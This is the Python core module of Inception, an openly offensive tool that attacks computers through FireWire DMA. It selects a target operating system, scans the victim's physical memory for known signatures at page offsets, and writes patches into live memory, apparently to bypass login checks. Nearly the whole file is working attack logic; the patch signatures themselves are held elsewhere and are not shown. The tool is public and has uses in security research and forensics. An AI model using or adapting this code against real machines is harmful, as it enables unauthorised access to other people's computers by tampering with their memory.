'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jun 23, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import firewire, cfg, sound, util, term
import os
import sys
import time


def select_target(targets, selected=False):
    '''
    Provides easy selection of targets. Input is a list of targets (dicts)
    '''
    if len(targets) == 1:
        term.info('Only one target present, auto-selected')
        return targets[0]
    if not selected:
        selected = term.poll('Please select target (or enter \'q\' to quit):')
    nof_targets = len(targets)
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            term.warn('Invalid selection, please try again. Type \'q\' to quit')
            return select_target(targets)
    if 0 < selected <= nof_targets:
        return targets[selected - 1]
    else:
        term.warn('Please enter a selection between 1 and ' + str(nof_targets) + 
                  '. Type \'q\' to quit')
        return select_target(targets)
    

def printdetails(target): # TODO: Fix this fugly method
    '''
    Prints details about a target
    '''
    term.info('The target module contains the following signatures:')
    term.separator()
    print('\tVersions:\t' + ', '.join(target['versions']).rstrip(', '))
    print('\tArchitectures:\t' + ', '
          .join(target['architectures']).rstrip(', '))
    for signature in target['signatures']:
        offsets = '\n\t\tOffsets:\t'
        for offset in signature['offsets']:
            offsets += hex(offset)
            if not offset is signature['offsets'][-1]: offsets += ', '
        print(offsets)
        sig = '\t\tSignature:\t0x'
        ioffs = 0
        patch = 0
        poffs = 0
        for chunk in signature['chunks']:
            diff = chunk['internaloffset'] - util.bytelen(chunk['chunk']) - 1 - ioffs
            sig += '__' * diff
            ioffs = chunk['internaloffset']
            sig += '{0:x}'.format(chunk['chunk'])
            try:
                patch = chunk['patch']
                poffs = chunk['patchoffset']
            except KeyError: pass
        print(sig)
        print('\t\tPatch:\t\t{0:#x}'.format(patch))
        print('\t\tPatch offset:\t{0:#x}'.format(poffs))
        
    term.separator()
    
    
def list_targets(targets, details=False):
    term.info('Available targets (known signatures):')
    term.separator()
    for number, target in enumerate(targets, 1):
                term.info(target['OS'] + ': ' + target['name'], sign = number)
                if details:
                    printdetails(target)
    if not details: # Avoid duplicate separator
        term.separator()
    

def siglen(l):
    '''
    Accepts dicts with key 'internaloffset', and calculates the length of the 
    total signature in number of bytes
    '''
    index = value = 0
    for i in range(len(l)):
        if l[i]['internaloffset'] > value:
            value = l[i]['internaloffset']
            index = i
    # Must decrement bytelen with one since byte positions start at zero
    return util.bytelen(l[index]['chunk']) - 1 + value


def match(candidate, chunks):
    '''
    Matches a candidate read from memory with the signature chunks
    '''
    for c in chunks:
        ioffset = c['internaloffset']
        if c['chunk'] != candidate[ioffset:ioffset + len(c['chunk'])]:
            return False
    return True
    

def patch(device, address, chunks):
    '''
    Writes to the device at address, using the patches in the signature
    chunks
    '''
    success = True
    backup = device.read(address, cfg.PAGESIZE)

    for c in chunks:
        if len(cfg.patchfile) > 0:
            patch = cfg.patchfile
        else:
            patch = c['patch']
        if not patch:
            continue

        ioffset = c['internaloffset']
        poffset = c['patchoffset']
        if not poffset: 
            poffset = 0
        realaddress = address + ioffset + poffset

        device.write(realaddress, patch)
        read = device.read(realaddress, len(patch))
        if cfg.verbose:
            term.info('Data read back: ' + util.bytes2hexstr(read)) #TODO: Change to .format()
        if read != patch:
            success = False

        # Only patch once from file
        if len(cfg.patchfile) > 0:
            break

    return success, backup
        

def searchanddestroy(device, target, memsize):
    '''
    Main search loop
    '''
    pageaddress = cfg.startaddress
    signatures = target['signatures']

    # Add signature lengths in bytes to the dictionary, and replace integer
    # representations of the signatures and patches with bytes
    for signature in signatures:
        signature['length'] = siglen(signature['chunks'])
        offsets = signature['offsets'] # Offsets within pages
        for chunk in signature['chunks']:
            chunk['chunk'] = util.int2bytes(chunk['chunk'])
            try:
                chunk['patch'] = util.int2bytes(chunk['patch'])
            except KeyError:
                chunk['patch'] = None
    
    # Progress bar
    prog = term.ProgressBar(max_value = memsize, total_width = cfg.wrapper.width, 
                            print_data = cfg.verbose)

    try:
        # Build a batch of read requests of the form: [(addr1, len1), ...] and
        # a corresponding match vector: [(chunks1, patchoffset1), ...]
        j = 0
        count = 0
        cand = b'\x00'
        r = []
        p = []
        while pageaddress < memsize:
            sig_len = len(signatures)
            
            for i in range(sig_len): # Iterate over signatures
                offsets = signatures[i]['offsets'] # Offsets within pages
                if isinstance(offsets, int):
                    offsets = [offsets] # Create a list if single offset
                chunks = signatures[i]['chunks'] # The chunks that is the sig
                length = signatures[i]['length'] # Sig length in bytes
                offset_len = len(offsets)
                
                for n in range(offset_len): # Iterate over offsets
                    address = pageaddress + offsets[n] + cfg.PAGESIZE * j
                    r.append((address, length))
                    p.append(chunks)
                    count += 1
                    # If we have built a full vector, read from memory and
                    # compare to the corresponding signatures
                    if count == cfg.vectorsize:
                        # Read data from device
                        m = 0
                        for caddr, cand  in device.readv(r):
                            if match(cand, p[m]):
                                print()
                                return (caddr, p[m])
                            m += 1                    
                        # Jump to next pages (we're finished with these)
                        mask = ~(cfg.PAGESIZE - 0x01)
                        pageaddress = address & mask
                        if sig_len == i and offset_len == n:
                            pageaddress = pageaddress + cfg.PAGESIZE
                            
                        # Zero out counters and vectors
                        j = 0
                        count = 0
                        r = []
                        p = []
                        
                        # Print status
                        prog.update_amount(pageaddress, cand)
                        prog.draw()
                         
            j += 1 # Increase read request count
            
    except IOError:
        print()
        term.fail('I/O Error, make sure FireWire interfaces are properly ' +
                  'connected')
    except KeyboardInterrupt:
        print()
        term.fail('Aborted')
        raise KeyboardInterrupt
    
    # If we get here, we haven't found anything :-/
    print()    
    return (None, None)


def attack(targets):
    '''
    Main attack logic
    '''
    # Initialize
    if not cfg.filemode:
        try:
            fw = firewire.FireWire()
        except IOError:
            term.fail('Could not initialize FireWire. Are the modules ' +
                      'loaded into the kernel?')
        start = time.time()
        device_index = fw.select_device()

    # List targets
    list_targets(targets)
       
    # Select target
    target = select_target(targets)
    
    # Print selection. If verbose, print selection with signatures
    term.info('Selected target: ' + target['OS'] + ': ' + target['name'])
    if cfg.verbose:
        printdetails(target)
    
    # Lower DMA shield or use a file as input, and set memsize
    device = None
    memsize = None
    if cfg.filemode:
        device = util.MemoryFile(cfg.filename, cfg.PAGESIZE)
        memsize = os.path.getsize(cfg.filename)
    else:
        elapsed = int(time.time() - start)
        device = fw.getdevice(device_index, elapsed)
        memsize = cfg.memsize
    
    # Perform parallel search for all signatures for each OS at the known 
    # offsets
    term.info('DMA shields should be down by now. Attacking...')
    address, chunks = searchanddestroy(device, target, memsize)
    if not address:
        # TODO: Fall-back sequential search?
        return None, None
    
    # Signature found, let's patch
    mask = 0xfffff000 # Mask away the lower bits to find the page number
    page = int((address & mask) / cfg.PAGESIZE)
    term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
    if not cfg.dry_run:
        success, backup = patch(device, address, chunks)
        if success:
            if cfg.egg:
                sound.play('resources/inception.wav')
            term.info('Patch verified; successful')
            term.info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
        else:
            term.warn('Write-back could not be verified; patching *may* ' +
                      'have been unsuccessful')

        if cfg.revert:
            term.poll('Press [enter] to revert the patch:')
            device.write(address, backup)

            if backup == device.read(address, cfg.PAGESIZE):
                term.info('Revert patch verified; successful')
            else:
                term.warn('Revert patch could not be verified')

    #Clean up
    device.close()
    
    return address, page
